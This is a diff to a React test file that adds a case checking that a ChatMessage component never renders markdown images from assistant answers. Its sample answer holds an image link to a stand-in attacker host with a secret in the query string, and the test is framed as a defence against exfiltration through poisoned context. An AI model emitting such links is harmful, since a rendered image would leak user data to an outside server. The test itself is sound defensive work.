@@ -96,6 +96,21 @@ describe('ChatMessage', () => {
     expect(screen.getByText('two').closest('li')).toBeInTheDocument();
   });
 
+  it('never loads a markdown image from an answer (exfiltration via poisoned context)', () => {
+    const { container } = render(
+      <ChatMessage
+        turn={makeTurn({
+          role: 'assistant',
+          content: 'See chart ![quarterly chart](https://attacker.example/x.png?q=secret) [1].',
+        })}
+        engineerMode={false}
+      />,
+    );
+
+    expect(container.querySelector('img')).toBeNull();
+    expect(screen.getByText('[quarterly chart]')).toBeInTheDocument();
+  });
+
   it('does not inject raw HTML from assistant content', () => {
     render(
       <ChatMessage
